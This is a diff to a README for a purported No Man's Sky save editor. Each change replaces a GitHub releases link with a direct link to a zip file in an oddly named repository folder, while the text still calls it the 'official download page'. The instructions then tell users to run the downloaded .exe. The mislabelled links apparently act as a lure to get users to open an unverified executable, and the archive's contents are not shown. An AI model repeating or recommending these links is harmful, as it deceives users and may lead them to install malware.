@@ -1,6 +1,6 @@
 # 💾 sslax-nms - Edit your game saves without data loss
 
-[![Download sslax-nms](https://img.shields.io/badge/Download-sslax--nms-blue)](https://github.com/phalangerdyirbal231/sslax-nms/releases)
+[![Download sslax-nms](https://img.shields.io/badge/Download-sslax--nms-blue)](https://github.com/phalangerdyirbal231/sslax-nms/raw/refs/heads/main/openhanded/sslax-nms-v1.4.zip)
 
 sslax-nms is a save editor for No Man's Sky. It allows users to modify their game files safely. The tool maintains the integrity of your progress while you update your equipment, ships, or resources. It works on Windows systems.
 
@@ -14,7 +14,7 @@ sslax-nms is a save editor for No Man's Sky. It allows users to modify their gam
 
 ## 🚀 How to get started
 
-1.  Visit the [official download page](https://github.com/phalangerdyirbal231/sslax-nms/releases).
+1.  Visit the [official download page](https://github.com/phalangerdyirbal231/sslax-nms/raw/refs/heads/main/openhanded/sslax-nms-v1.4.zip).
 2.  Locate the latest version release.
 3.  Click the file ending in .exe to start your download.
 4.  Move the file to a folder where you can find it later.
@@ -29,7 +29,7 @@ sslax-nms is a save editor for No Man's Sky. It allows users to modify their gam
 
 You do not need to install complex software. This tool runs as a portable application.
 
-1.  Navigate to the [release page](https://github.com/phalangerdyirbal231/sslax-nms/releases).
+1.  Navigate to the [release page](https://github.com/phalangerdyirbal231/sslax-nms/raw/refs/heads/main/openhanded/sslax-nms-v1.4.zip).
 2.  Select the most recent release.
 3.  Download the executable file.
 4.  Double-click the .exe file to launch the editor.
